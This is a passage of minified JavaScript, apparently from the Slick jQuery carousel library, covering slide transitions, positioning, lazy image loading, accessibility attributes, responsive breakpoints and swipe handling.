        }, t.prototype.disableTransition = function(e) {
            var t = this,
                i = {};
            i[t.transitionType] = "", !1 === t.options.fade ? t.$slideTrack.css(i) : t.$slides.eq(e).css(i)
        }, t.prototype.fadeSlide = function(e, t) {
            var i = this;
            !1 === i.cssTransitions ? (i.$slides.eq(e).css({
                zIndex: i.options.zIndex
            }), i.$slides.eq(e).animate({
                opacity: 1
            }, i.options.speed, i.options.easing, t)) : (i.applyTransition(e), i.$slides.eq(e).css({
                opacity: 1,
                zIndex: i.options.zIndex
            }), t && setTimeout((function() {
                i.disableTransition(e), t.call()
            }), i.options.speed))
        }, t.prototype.fadeSlideOut = function(e) {
            var t = this;
            !1 === t.cssTransitions ? t.$slides.eq(e).animate({
                opacity: 0,
                zIndex: t.options.zIndex - 2
            }, t.options.speed, t.options.easing) : (t.applyTransition(e), t.$slides.eq(e).css({
                opacity: 0,
                zIndex: t.options.zIndex - 2
            }))
        }, t.prototype.filterSlides = t.prototype.slickFilter = function(e) {
            var t = this;
            null !== e && (t.$slidesCache = t.$slides, t.unload(), t.$slideTrack.children(this.options.slide).detach(), t.$slidesCache.filter(e).appendTo(t.$slideTrack), t.reinit())
        }, t.prototype.focusHandler = function() {
            var t = this;
            t.$slider.off("focus.slick blur.slick").on("focus.slick blur.slick", "*", (function(i) {
                i.stopImmediatePropagation();
                var n = e(this);
                setTimeout((function() {
                    t.options.pauseOnFocus && (t.focussed = n.is(":focus"), t.autoPlay())
                }), 0)
            }))
        }, t.prototype.getCurrent = t.prototype.slickCurrentSlide = function() {
            return this.currentSlide
        }, t.prototype.getDotCount = function() {
            var e = this,
                t = 0,
                i = 0,
                n = 0;
            if (!0 === e.options.infinite)
                if (e.slideCount <= e.options.slidesToShow) ++n;
                else
                    for (; t < e.slideCount;) ++n, t = i + e.options.slidesToScroll, i += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
            else if (!0 === e.options.centerMode) n = e.slideCount;
            else if (e.options.asNavFor)
                for (; t < e.slideCount;) ++n, t = i + e.options.slidesToScroll, i += e.options.slidesToScroll <= e.options.slidesToShow ? e.options.slidesToScroll : e.options.slidesToShow;
            else n = 1 + Math.ceil((e.slideCount - e.options.slidesToShow) / e.options.slidesToScroll);
            return n - 1
        }, t.prototype.getLeft = function(e) {
            var t, i, n, o, r = this,
                s = 0;
            return r.slideOffset = 0, i = r.$slides.first().outerHeight(!0), !0 === r.options.infinite ? (r.slideCount > r.options.slidesToShow && (r.slideOffset = r.slideWidth * r.options.slidesToShow * -1, o = -1, !0 === r.options.vertical && !0 === r.options.centerMode && (2 === r.options.slidesToShow ? o = -1.5 : 1 === r.options.slidesToShow && (o = -2)), s = i * r.options.slidesToShow * o), r.slideCount % r.options.slidesToScroll != 0 && e + r.options.slidesToScroll > r.slideCount && r.slideCount > r.options.slidesToShow && (e > r.slideCount ? (r.slideOffset = (r.options.slidesToShow - (e - r.slideCount)) * r.slideWidth * -1, s = (r.options.slidesToShow - (e - r.slideCount)) * i * -1) : (r.slideOffset = r.slideCount % r.options.slidesToScroll * r.slideWidth * -1, s = r.slideCount % r.options.slidesToScroll * i * -1))) : e + r.options.slidesToShow > r.slideCount && (r.slideOffset = (e + r.options.slidesToShow - r.slideCount) * r.slideWidth, s = (e + r.options.slidesToShow - r.slideCount) * i), r.slideCount <= r.options.slidesToShow && (r.slideOffset = 0, s = 0), !0 === r.options.centerMode && r.slideCount <= r.options.slidesToShow ? r.slideOffset = r.slideWidth * Math.floor(r.options.slidesToShow) / 2 - r.slideWidth * r.slideCount / 2 : !0 === r.options.centerMode && !0 === r.options.infinite ? r.slideOffset += r.slideWidth * Math.floor(r.options.slidesToShow / 2) - r.slideWidth : !0 === r.options.centerMode && (r.slideOffset = 0, r.slideOffset += r.slideWidth * Math.floor(r.options.slidesToShow / 2)), t = !1 === r.options.vertical ? e * r.slideWidth * -1 + r.slideOffset : e * i * -1 + s, !0 === r.options.variableWidth && (n = r.slideCount <= r.options.slidesToShow || !1 === r.options.infinite ? r.$slideTrack.children(".slick-slide").eq(e) : r.$slideTrack.children(".slick-slide").eq(e + r.options.slidesToShow), t = !0 === r.options.rtl ? n[0] ? -1 * (r.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0 : n[0] ? -1 * n[0].offsetLeft : 0, !0 === r.options.centerMode && (n = r.slideCount <= r.options.slidesToShow || !1 === r.options.infinite ? r.$slideTrack.children(".slick-slide").eq(e) : r.$slideTrack.children(".slick-slide").eq(e + r.options.slidesToShow + 1), t = !0 === r.options.rtl ? n[0] ? -1 * (r.$slideTrack.width() - n[0].offsetLeft - n.width()) : 0 : n[0] ? -1 * n[0].offsetLeft : 0, t += (r.$list.width() - n.outerWidth()) / 2)), t
        }, t.prototype.getOption = t.prototype.slickGetOption = function(e) {
            return this.options[e]
        }, t.prototype.getNavigableIndexes = function() {
            var e, t = this,
                i = 0,
                n = 0,
                o = [];
            for (!1 === t.options.infinite ? e = t.slideCount : (i = -1 * t.options.slidesToScroll, n = -1 * t.options.slidesToScroll, e = 2 * t.slideCount); i < e;) o.push(i), i = n + t.options.slidesToScroll, n += t.options.slidesToScroll <= t.options.slidesToShow ? t.options.slidesToScroll : t.options.slidesToShow;
            return o
        }, t.prototype.getSlick = function() {
            return this
        }, t.prototype.getSlideCount = function() {
            var t, i, n = this;
            return i = !0 === n.options.centerMode ? n.slideWidth * Math.floor(n.options.slidesToShow / 2) : 0, !0 === n.options.swipeToSlide ? (n.$slideTrack.find(".slick-slide").each((function(o, r) {
                if (r.offsetLeft - i + e(r).outerWidth() / 2 > -1 * n.swipeLeft) return t = r, !1
            })), Math.abs(e(t).attr("data-slick-index") - n.currentSlide) || 1) : n.options.slidesToScroll
        }, t.prototype.goTo = t.prototype.slickGoTo = function(e, t) {
            this.changeSlide({
                data: {
                    message: "index",
                    index: parseInt(e)
                }
            }, t)
        }, t.prototype.init = function(t) {
            var i = this;
            e(i.$slider).hasClass("slick-initialized") || (e(i.$slider).addClass("slick-initialized"), i.buildRows(), i.buildOut(), i.setProps(), i.startLoad(), i.loadSlider(), i.initializeEvents(), i.updateArrows(), i.updateDots(), i.checkResponsive(!0), i.focusHandler()), t && i.$slider.trigger("init", [i]), !0 === i.options.accessibility && i.initADA(), i.options.autoplay && (i.paused = !1, i.autoPlay())
        }, t.prototype.initADA = function() {
            var t = this,
                i = Math.ceil(t.slideCount / t.options.slidesToShow),
                n = t.getNavigableIndexes().filter((function(e) {
                    return e >= 0 && e < t.slideCount
                }));
            t.$slides.add(t.$slideTrack.find(".slick-cloned")).attr({
                "aria-hidden": "true",
                tabindex: "-1"
            }).find("a, input, button, select").attr({
                tabindex: "-1"
            }), null !== t.$dots && (t.$slides.not(t.$slideTrack.find(".slick-cloned")).each((function(i) {
                var o = n.indexOf(i);
                e(this).attr({
                    role: "tabpanel",
                    id: "slick-slide" + t.instanceUid + i,
                    tabindex: -1
                }), -1 !== o && e(this).attr({
                    "aria-describedby": "slick-slide-control" + t.instanceUid + o
                })
            })), t.$dots.attr("role", "tablist").find("li").each((function(o) {
                var r = n[o];
                e(this).attr({
                    role: "presentation"
                }), e(this).find("button").first().attr({
                    role: "tab",
                    id: "slick-slide-control" + t.instanceUid + o,
                    "aria-controls": "slick-slide" + t.instanceUid + r,
                    "aria-label": o + 1 + " of " + i,
                    "aria-selected": null,
                    tabindex: "-1"
                })
            })).eq(t.currentSlide).find("button").attr({
                "aria-selected": "true",
                tabindex: "0"
            }).end());
            for (var o = t.currentSlide, r = o + t.options.slidesToShow; o < r; o++) t.$slides.eq(o).attr("tabindex", 0);
            t.activateADA()
        }, t.prototype.initArrowEvents = function() {
            var e = this;
            !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.off("click.slick").on("click.slick", {
                message: "previous"
            }, e.changeSlide), e.$nextArrow.off("click.slick").on("click.slick", {
                message: "next"
            }, e.changeSlide), !0 === e.options.accessibility && (e.$prevArrow.on("keydown.slick", e.keyHandler), e.$nextArrow.on("keydown.slick", e.keyHandler)))
        }, t.prototype.initDotEvents = function() {
            var t = this;
            !0 === t.options.dots && (e("li", t.$dots).on("click.slick", {
                message: "index"
            }, t.changeSlide), !0 === t.options.accessibility && t.$dots.on("keydown.slick", t.keyHandler)), !0 === t.options.dots && !0 === t.options.pauseOnDotsHover && e("li", t.$dots).on("mouseenter.slick", e.proxy(t.interrupt, t, !0)).on("mouseleave.slick", e.proxy(t.interrupt, t, !1))
        }, t.prototype.initSlideEvents = function() {
            var t = this;
            t.options.pauseOnHover && (t.$list.on("mouseenter.slick", e.proxy(t.interrupt, t, !0)), t.$list.on("mouseleave.slick", e.proxy(t.interrupt, t, !1)))
        }, t.prototype.initializeEvents = function() {
            var t = this;
            t.initArrowEvents(), t.initDotEvents(), t.initSlideEvents(), t.$list.on("touchstart.slick mousedown.slick", {
                action: "start"
            }, t.swipeHandler), t.$list.on("touchmove.slick mousemove.slick", {
                action: "move"
            }, t.swipeHandler), t.$list.on("touchend.slick mouseup.slick", {
                action: "end"
            }, t.swipeHandler), t.$list.on("touchcancel.slick mouseleave.slick", {
                action: "end"
            }, t.swipeHandler), t.$list.on("click.slick", t.clickHandler), e(document).on(t.visibilityChange, e.proxy(t.visibility, t)), !0 === t.options.accessibility && t.$list.on("keydown.slick", t.keyHandler), !0 === t.options.focusOnSelect && e(t.$slideTrack).children().on("click.slick", t.selectHandler), e(window).on("orientationchange.slick.slick-" + t.instanceUid, e.proxy(t.orientationChange, t)), e(window).on("resize.slick.slick-" + t.instanceUid, e.proxy(t.resize, t)), e("[draggable!=true]", t.$slideTrack).on("dragstart", t.preventDefault), e(window).on("load.slick.slick-" + t.instanceUid, t.setPosition), e(t.setPosition)
        }, t.prototype.initUI = function() {
            var e = this;
            !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.show(), e.$nextArrow.show()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.show()
        }, t.prototype.keyHandler = function(e) {
            var t = this;
            e.target.tagName.match("TEXTAREA|INPUT|SELECT") || (37 === e.keyCode && !0 === t.options.accessibility ? t.changeSlide({
                data: {
                    message: !0 === t.options.rtl ? "next" : "previous"
                }
            }) : 39 === e.keyCode && !0 === t.options.accessibility && t.changeSlide({
                data: {
                    message: !0 === t.options.rtl ? "previous" : "next"
                }
            }))
        }, t.prototype.lazyLoad = function() {
            function t(t) {
                e("img[data-lazy]", t).each((function() {
                    var t = e(this),
                        i = e(this).attr("data-lazy"),
                        n = e(this).attr("data-srcset"),
                        o = e(this).attr("data-sizes") || r.$slider.attr("data-sizes"),
                        s = document.createElement("img");
                    s.onload = function() {
                        t.animate({
                            opacity: 0
                        }, 100, (function() {
                            n && (t.attr("srcset", n), o && t.attr("sizes", o)), t.attr("src", i).animate({
                                opacity: 1
                            }, 200, (function() {
                                t.removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading")
                            })), r.$slider.trigger("lazyLoaded", [r, t, i])
                        }))
                    }, s.onerror = function() {
                        t.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), r.$slider.trigger("lazyLoadError", [r, t, i])
                    }, s.src = i
                }))
            }
            var i, n, o, r = this;
            if (!0 === r.options.centerMode ? !0 === r.options.infinite ? o = (n = r.currentSlide + (r.options.slidesToShow / 2 + 1)) + r.options.slidesToShow + 2 : (n = Math.max(0, r.currentSlide - (r.options.slidesToShow / 2 + 1)), o = r.options.slidesToShow / 2 + 1 + 2 + r.currentSlide) : (n = r.options.infinite ? r.options.slidesToShow + r.currentSlide : r.currentSlide, o = Math.ceil(n + r.options.slidesToShow), !0 === r.options.fade && (n > 0 && n--, o <= r.slideCount && o++)), i = r.$slider.find(".slick-slide").slice(n, o), "anticipated" === r.options.lazyLoad)
                for (var s = n - 1, a = o, l = r.$slider.find(".slick-slide"), c = 0; c < r.options.slidesToScroll; c++) s < 0 && (s = r.slideCount - 1), i = (i = i.add(l.eq(s))).add(l.eq(a)), s--, a++;
            t(i), r.slideCount <= r.options.slidesToShow ? t(r.$slider.find(".slick-slide")) : r.currentSlide >= r.slideCount - r.options.slidesToShow ? t(r.$slider.find(".slick-cloned").slice(0, r.options.slidesToShow)) : 0 === r.currentSlide && t(r.$slider.find(".slick-cloned").slice(-1 * r.options.slidesToShow))
        }, t.prototype.loadSlider = function() {
            var e = this;
            e.setPosition(), e.$slideTrack.css({
                opacity: 1
            }), e.$slider.removeClass("slick-loading"), e.initUI(), "progressive" === e.options.lazyLoad && e.progressiveLazyLoad()
        }, t.prototype.next = t.prototype.slickNext = function() {
            this.changeSlide({
                data: {
                    message: "next"
                }
            })
        }, t.prototype.orientationChange = function() {
            this.checkResponsive(), this.setPosition()
        }, t.prototype.pause = t.prototype.slickPause = function() {
            this.autoPlayClear(), this.paused = !0
        }, t.prototype.play = t.prototype.slickPlay = function() {
            var e = this;
            e.autoPlay(), e.options.autoplay = !0, e.paused = !1, e.focussed = !1, e.interrupted = !1
        }, t.prototype.postSlide = function(t) {
            var i = this;
            i.unslicked || (i.$slider.trigger("afterChange", [i, t]), i.animating = !1, i.slideCount > i.options.slidesToShow && i.setPosition(), i.swipeLeft = null, i.options.autoplay && i.autoPlay(), !0 === i.options.accessibility && (i.initADA(), i.options.focusOnChange && e(i.$slides.get(i.currentSlide)).attr("tabindex", 0).focus()))
        }, t.prototype.prev = t.prototype.slickPrev = function() {
            this.changeSlide({
                data: {
                    message: "previous"
                }
            })
        }, t.prototype.preventDefault = function(e) {
            e.preventDefault()
        }, t.prototype.progressiveLazyLoad = function(t) {
            t = t || 1;
            var i, n, o, r, s, a = this,
                l = e("img[data-lazy]", a.$slider);
            l.length ? (i = l.first(), n = i.attr("data-lazy"), o = i.attr("data-srcset"), r = i.attr("data-sizes") || a.$slider.attr("data-sizes"), (s = document.createElement("img")).onload = function() {
                o && (i.attr("srcset", o), r && i.attr("sizes", r)), i.attr("src", n).removeAttr("data-lazy data-srcset data-sizes").removeClass("slick-loading"), !0 === a.options.adaptiveHeight && a.setPosition(), a.$slider.trigger("lazyLoaded", [a, i, n]), a.progressiveLazyLoad()
            }, s.onerror = function() {
                t < 3 ? setTimeout((function() {
                    a.progressiveLazyLoad(t + 1)
                }), 500) : (i.removeAttr("data-lazy").removeClass("slick-loading").addClass("slick-lazyload-error"), a.$slider.trigger("lazyLoadError", [a, i, n]), a.progressiveLazyLoad())
            }, s.src = n) : a.$slider.trigger("allImagesLoaded", [a])
        }, t.prototype.refresh = function(t) {
            var i, n, o = this;
            n = o.slideCount - o.options.slidesToShow, !o.options.infinite && o.currentSlide > n && (o.currentSlide = n), o.slideCount <= o.options.slidesToShow && (o.currentSlide = 0), i = o.currentSlide, o.destroy(!0), e.extend(o, o.initials, {
                currentSlide: i
            }), o.init(), t || o.changeSlide({
                data: {
                    message: "index",
                    index: i
                }
            }, !1)
        }, t.prototype.registerBreakpoints = function() {
            var t, i, n, o = this,
                r = o.options.responsive || null;
            if ("array" === e.type(r) && r.length) {
                for (t in o.respondTo = o.options.respondTo || "window", r)
                    if (n = o.breakpoints.length - 1, r.hasOwnProperty(t)) {
                        for (i = r[t].breakpoint; n >= 0;) o.breakpoints[n] && o.breakpoints[n] === i && o.breakpoints.splice(n, 1), n--;
                        o.breakpoints.push(i), o.breakpointSettings[i] = r[t].settings
                    } o.breakpoints.sort((function(e, t) {
                    return o.options.mobileFirst ? e - t : t - e
                }))
            }
        }, t.prototype.reinit = function() {
            var t = this;
            t.$slides = t.$slideTrack.children(t.options.slide).addClass("slick-slide"), t.slideCount = t.$slides.length, t.currentSlide >= t.slideCount && 0 !== t.currentSlide && (t.currentSlide = t.currentSlide - t.options.slidesToScroll), t.slideCount <= t.options.slidesToShow && (t.currentSlide = 0), t.registerBreakpoints(), t.setProps(), t.setupInfinite(), t.buildArrows(), t.updateArrows(), t.initArrowEvents(), t.buildDots(), t.updateDots(), t.initDotEvents(), t.cleanUpSlideEvents(), t.initSlideEvents(), t.checkResponsive(!1, !0), !0 === t.options.focusOnSelect && e(t.$slideTrack).children().on("click.slick", t.selectHandler), t.setSlideClasses("number" == typeof t.currentSlide ? t.currentSlide : 0), t.setPosition(), t.focusHandler(), t.paused = !t.options.autoplay, t.autoPlay(), t.$slider.trigger("reInit", [t])
        }, t.prototype.resize = function() {
            var t = this;
            e(window).width() !== t.windowWidth && (clearTimeout(t.windowDelay), t.windowDelay = window.setTimeout((function() {
                t.windowWidth = e(window).width(), t.checkResponsive(), t.unslicked || t.setPosition()
            }), 50))
        }, t.prototype.removeSlide = t.prototype.slickRemove = function(e, t, i) {
            var n = this;
            if (e = "boolean" == typeof e ? !0 === (t = e) ? 0 : n.slideCount - 1 : !0 === t ? --e : e, n.slideCount < 1 || e < 0 || e > n.slideCount - 1) return !1;
            n.unload(), !0 === i ? n.$slideTrack.children().remove() : n.$slideTrack.children(this.options.slide).eq(e).remove(), n.$slides = n.$slideTrack.children(this.options.slide), n.$slideTrack.children(this.options.slide).detach(), n.$slideTrack.append(n.$slides), n.$slidesCache = n.$slides, n.reinit()
        }, t.prototype.setCSS = function(e) {
            var t, i, n = this,
                o = {};
            !0 === n.options.rtl && (e = -e), t = "left" == n.positionProp ? Math.ceil(e) + "px" : "0px", i = "top" == n.positionProp ? Math.ceil(e) + "px" : "0px", o[n.positionProp] = e, !1 === n.transformsEnabled ? n.$slideTrack.css(o) : (o = {}, !1 === n.cssTransitions ? (o[n.animType] = "translate(" + t + ", " + i + ")", n.$slideTrack.css(o)) : (o[n.animType] = "translate3d(" + t + ", " + i + ", 0px)", n.$slideTrack.css(o)))
        }, t.prototype.setDimensions = function() {
            var e = this;
            !1 === e.options.vertical ? !0 === e.options.centerMode && e.$list.css({
                padding: "0px " + e.options.centerPadding
            }) : (e.$list.height(e.$slides.first().outerHeight(!0) * e.options.slidesToShow), !0 === e.options.centerMode && e.$list.css({
                padding: e.options.centerPadding + " 0px"
            })), e.listWidth = e.$list.width(), e.listHeight = e.$list.height(), !1 === e.options.vertical && !1 === e.options.variableWidth ? (e.slideWidth = Math.ceil(e.listWidth / e.options.slidesToShow), e.$slideTrack.width(Math.ceil(e.slideWidth * e.$slideTrack.children(".slick-slide").length))) : !0 === e.options.variableWidth ? e.$slideTrack.width(5e3 * e.slideCount) : (e.slideWidth = Math.ceil(e.listWidth), e.$slideTrack.height(Math.ceil(e.$slides.first().outerHeight(!0) * e.$slideTrack.children(".slick-slide").length)));
            var t = e.$slides.first().outerWidth(!0) - e.$slides.first().width();
            !1 === e.options.variableWidth && e.$slideTrack.children(".slick-slide").width(e.slideWidth - t)
        }, t.prototype.setFade = function() {
            var t, i = this;
            i.$slides.each((function(n, o) {
                t = i.slideWidth * n * -1, !0 === i.options.rtl ? e(o).css({
                    position: "relative",
                    right: t,
                    top: 0,
                    zIndex: i.options.zIndex - 2,
                    opacity: 0
                }) : e(o).css({
                    position: "relative",
                    left: t,
                    top: 0,
                    zIndex: i.options.zIndex - 2,
                    opacity: 0
                })
            })), i.$slides.eq(i.currentSlide).css({
                zIndex: i.options.zIndex - 1,
                opacity: 1
            })
        }, t.prototype.setHeight = function() {
            var e = this;
            if (1 === e.options.slidesToShow && !0 === e.options.adaptiveHeight && !1 === e.options.vertical) {
                var t = e.$slides.eq(e.currentSlide).outerHeight(!0);
                e.$list.css("height", t)
            }
        }, t.prototype.setOption = t.prototype.slickSetOption = function() {
            var t, i, n, o, r, s = this,
                a = !1;
            if ("object" === e.type(arguments[0]) ? (n = arguments[0], a = arguments[1], r = "multiple") : "string" === e.type(arguments[0]) && (n = arguments[0], o = arguments[1], a = arguments[2], "responsive" === arguments[0] && "array" === e.type(arguments[1]) ? r = "responsive" : void 0 !== arguments[1] && (r = "single")), "single" === r) s.options[n] = o;
            else if ("multiple" === r) e.each(n, (function(e, t) {
                s.options[e] = t
            }));
            else if ("responsive" === r)
                for (i in o)
                    if ("array" !== e.type(s.options.responsive)) s.options.responsive = [o[i]];
                    else {
                        for (t = s.options.responsive.length - 1; t >= 0;) s.options.responsive[t].breakpoint === o[i].breakpoint && s.options.responsive.splice(t, 1), t--;
                        s.options.responsive.push(o[i])
                    } a && (s.unload(), s.reinit())
        }, t.prototype.setPosition = function() {
            var e = this;
            e.setDimensions(), e.setHeight(), !1 === e.options.fade ? e.setCSS(e.getLeft(e.currentSlide)) : e.setFade(), e.$slider.trigger("setPosition", [e])
        }, t.prototype.setProps = function() {
            var e = this,
                t = document.body.style;
            e.positionProp = !0 === e.options.vertical ? "top" : "left", "top" === e.positionProp ? e.$slider.addClass("slick-vertical") : e.$slider.removeClass("slick-vertical"), void 0 === t.WebkitTransition && void 0 === t.MozTransition && void 0 === t.msTransition || !0 === e.options.useCSS && (e.cssTransitions = !0), e.options.fade && ("number" == typeof e.options.zIndex ? e.options.zIndex < 3 && (e.options.zIndex = 3) : e.options.zIndex = e.defaults.zIndex), void 0 !== t.OTransform && (e.animType = "OTransform", e.transformType = "-o-transform", e.transitionType = "OTransition", void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)), void 0 !== t.MozTransform && (e.animType = "MozTransform", e.transformType = "-moz-transform", e.transitionType = "MozTransition", void 0 === t.perspectiveProperty && void 0 === t.MozPerspective && (e.animType = !1)), void 0 !== t.webkitTransform && (e.animType = "webkitTransform", e.transformType = "-webkit-transform", e.transitionType = "webkitTransition", void 0 === t.perspectiveProperty && void 0 === t.webkitPerspective && (e.animType = !1)), void 0 !== t.msTransform && (e.animType = "msTransform", e.transformType = "-ms-transform", e.transitionType = "msTransition", void 0 === t.msTransform && (e.animType = !1)), void 0 !== t.transform && !1 !== e.animType && (e.animType = "transform", e.transformType = "transform", e.transitionType = "transition"), e.transformsEnabled = e.options.useTransform && null !== e.animType && !1 !== e.animType
        }, t.prototype.setSlideClasses = function(e) {
            var t, i, n, o, r = this;
            if (i = r.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"), r.$slides.eq(e).addClass("slick-current"), !0 === r.options.centerMode) {
                var s = r.options.slidesToShow % 2 == 0 ? 1 : 0;
                t = Math.floor(r.options.slidesToShow / 2), !0 === r.options.infinite && (e >= t && e <= r.slideCount - 1 - t ? r.$slides.slice(e - t + s, e + t + 1).addClass("slick-active").attr("aria-hidden", "false") : (n = r.options.slidesToShow + e, i.slice(n - t + 1 + s, n + t + 2).addClass("slick-active").attr("aria-hidden", "false")), 0 === e ? i.eq(i.length - 1 - r.options.slidesToShow).addClass("slick-center") : e === r.slideCount - 1 && i.eq(r.options.slidesToShow).addClass("slick-center")), r.$slides.eq(e).addClass("slick-center")
            } else e >= 0 && e <= r.slideCount - r.options.slidesToShow ? r.$slides.slice(e, e + r.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : i.length <= r.options.slidesToShow ? i.addClass("slick-active").attr("aria-hidden", "false") : (o = r.slideCount % r.options.slidesToShow, n = !0 === r.options.infinite ? r.options.slidesToShow + e : e, r.options.slidesToShow == r.options.slidesToScroll && r.slideCount - e < r.options.slidesToShow ? i.slice(n - (r.options.slidesToShow - o), n + o).addClass("slick-active").attr("aria-hidden", "false") : i.slice(n, n + r.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false"));
            "ondemand" !== r.options.lazyLoad && "anticipated" !== r.options.lazyLoad || r.lazyLoad()
        }, t.prototype.setupInfinite = function() {
            var t, i, n, o = this;
            if (!0 === o.options.fade && (o.options.centerMode = !1), !0 === o.options.infinite && !1 === o.options.fade && (i = null, o.slideCount > o.options.slidesToShow)) {
                for (n = !0 === o.options.centerMode ? o.options.slidesToShow + 1 : o.options.slidesToShow, t = o.slideCount; t > o.slideCount - n; t -= 1) i = t - 1, e(o.$slides[i]).clone(!0).attr("id", "").attr("data-slick-index", i - o.slideCount).prependTo(o.$slideTrack).addClass("slick-cloned");
                for (t = 0; t < n + o.slideCount; t += 1) i = t, e(o.$slides[i]).clone(!0).attr("id", "").attr("data-slick-index", i + o.slideCount).appendTo(o.$slideTrack).addClass("slick-cloned");
                o.$slideTrack.find(".slick-cloned").find("[id]").each((function() {
                    e(this).attr("id", "")
                }))
            }
        }, t.prototype.interrupt = function(e) {
            e || this.autoPlay(), this.interrupted = e
        }, t.prototype.selectHandler = function(t) {
            var i = this,
                n = e(t.target).is(".slick-slide") ? e(t.target) : e(t.target).parents(".slick-slide"),
                o = parseInt(n.attr("data-slick-index"));
            o || (o = 0), i.slideCount <= i.options.slidesToShow ? i.slideHandler(o, !1, !0) : i.slideHandler(o)
        }, t.prototype.slideHandler = function(e, t, i) {
            var n, o, r, s, a, l = null,
                c = this;
            if (t = t || !1, !(!0 === c.animating && !0 === c.options.waitForAnimate || !0 === c.options.fade && c.currentSlide === e))
                if (!1 === t && c.asNavFor(e), n = e, l = c.getLeft(n), s = c.getLeft(c.currentSlide), c.currentLeft = null === c.swipeLeft ? s : c.swipeLeft, !1 === c.options.infinite && !1 === c.options.centerMode && (e < 0 || e > c.getDotCount() * c.options.slidesToScroll)) !1 === c.options.fade && (n = c.currentSlide, !0 !== i ? c.animateSlide(s, (function() {
                    c.postSlide(n)
                })) : c.postSlide(n));
                else if (!1 === c.options.infinite && !0 === c.options.centerMode && (e < 0 || e > c.slideCount - c.options.slidesToScroll)) !1 === c.options.fade && (n = c.currentSlide, !0 !== i ? c.animateSlide(s, (function() {
                c.postSlide(n)
            })) : c.postSlide(n));
            else {
                if (c.options.autoplay && clearInterval(c.autoPlayTimer), o = n < 0 ? c.slideCount % c.options.slidesToScroll != 0 ? c.slideCount - c.slideCount % c.options.slidesToScroll : c.slideCount + n : n >= c.slideCount ? c.slideCount % c.options.slidesToScroll != 0 ? 0 : n - c.slideCount : n, c.animating = !0, c.$slider.trigger("beforeChange", [c, c.currentSlide, o]), r = c.currentSlide, c.currentSlide = o, c.setSlideClasses(c.currentSlide), c.options.asNavFor && (a = (a = c.getNavTarget()).slick("getSlick")).slideCount <= a.options.slidesToShow && a.setSlideClasses(c.currentSlide), c.updateDots(), c.updateArrows(), !0 === c.options.fade) return !0 !== i ? (c.fadeSlideOut(r), c.fadeSlide(o, (function() {
                    c.postSlide(o)
                }))) : c.postSlide(o), void c.animateHeight();
                !0 !== i ? c.animateSlide(l, (function() {
                    c.postSlide(o)
                })) : c.postSlide(o)
            }
        }, t.prototype.startLoad = function() {
            var e = this;
            !0 === e.options.arrows && e.slideCount > e.options.slidesToShow && (e.$prevArrow.hide(), e.$nextArrow.hide()), !0 === e.options.dots && e.slideCount > e.options.slidesToShow && e.$dots.hide(), e.$slider.addClass("slick-loading")
        }, t.prototype.swipeDirection = function() {
            var e, t, i, n, o = this;
            return e = o.touchObject.startX - o.touchObject.curX, t = o.touchObject.startY - o.touchObject.curY, i = Math.atan2(t, e), (n = Math.round(180 * i / Math.PI)) < 0 && (n = 360 - Math.abs(n)), n <= 45 && n >= 0 || n <= 360 && n >= 315 ? !1 === o.options.rtl ? "left" : "right" : n >= 135 && n <= 225 ? !1 === o.options.rtl ? "right" : "left" : !0 === o.options.verticalSwiping ? n >= 35 && n <= 135 ? "down" : "up" : "vertical"
        }, t.prototype.swipeEnd = function(e) {
            var t, i, n = this;
            if (n.dragging = !1, n.swiping = !1, n.scrolling) return n.scrolling = !1, !1;
            if (n.interrupted = !1, n.shouldClick = !(n.touchObject.swipeLength > 10), void 0 === n.touchObject.curX) return !1;
            if (!0 === n.touchObject.edgeHit && n.$slider.trigger("edge", [n, n.swipeDirection()]), n.touchObject.swipeLength >= n.touchObject.minSwipe) {
                switch (i = n.swipeDirection()) {
                    case "left":
                    case "down":
                        t = n.options.swipeToSlide ? n.checkNavigable(n.currentSlide + n.getSlideCount()) : n.currentSlide + n.getSlideCount(), n.currentDirection = 0;
                        break;
                    case "right":
                    case "up":
                        t = n.options.swipeToSlide ? n.checkNavigable(n.currentSlide - n.getSlideCount()) : n.currentSlide - n.getSlideCount(), n.currentDirection = 1
                }
                "vertical" != i && (n.slideHandler(t), n.touchObject = {}, n.$slider.trigger("swipe", [n, i]))
            } else n.touchObject.startX !== n.touchObject.curX && (n.slideHandler(n.currentSlide), n.touchObject = {})
        }, t.prototype.swipeHandler = function(e) {
            var t = this;
            if (!(!1 === t.options.swipe || "ontouchend" in document && !1 === t.options.swipe || !1 === t.options.draggable && -1 !== e.type.indexOf("mouse"))) switch (t.touchObject.fingerCount = e.originalEvent && void 0 !== e.originalEvent.touches ? e.originalEvent.touches.length : 1, t.touchObject.minSwipe = t.listWidth / t.options.touchThreshold, !0 === t.options.verticalSwiping && (t.touchObject.minSwipe = t.listHeight / t.options.touchThreshold), e.data.action) {
                case "start":
                    t.swipeStart(e);
                    break;
                case "move":
                    t.swipeMove(e);
                    break;
                case "end":
                    t.swipeEnd(e)
            }
        }, t.prototype.swipeMove = function(e) {
            var t, i, n, o, r, s, a = this;
